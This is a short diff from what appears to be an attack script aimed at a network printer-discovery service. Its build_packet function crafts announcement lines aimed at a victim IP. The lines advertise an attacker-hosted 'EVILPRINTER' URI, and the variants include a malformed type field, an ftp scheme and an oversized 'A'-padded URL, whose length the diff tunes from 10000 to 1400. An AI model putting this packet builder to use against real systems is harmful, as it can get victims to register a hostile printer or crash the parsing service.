@@ -10,7 +10,7 @@ def build_packet(args, variant):
     victimIP = args.target
     myIP = args.my_ip
     printerURI = f"http://{myIP}:{args.printer_port}/printers/EVILPRINTER"
-    variantLines = [f'0 ZZ {printerURI} "{args.location}" "{args.info}"', "http://" + "A" * 10000 + "/printers/EVILPRINTER", f'0 3 ftp://{myIP}:{args.printer_port}/printers/EVILPRINTER "{args.location}" "{args.info}"', f'0 3 {printerURI} "{args.location}" "{args.info}"']
+    variantLines = [f'0 ZZ {printerURI} "{args.location}" "{args.info}"', "http://" + "A" * 1400 + "/printers/EVILPRINTER", f'0 3 ftp://{myIP}:{args.printer_port}/printers/EVILPRINTER "{args.location}" "{args.info}"', f'0 3 {printerURI} "{args.location}" "{args.info}"']
     oversizedLine = f'0 3 {variantLines[1]} "{args.location}" "{args.info}"'
     variantLines[1] = oversizedLine
     for i in range(len(variantLines)):
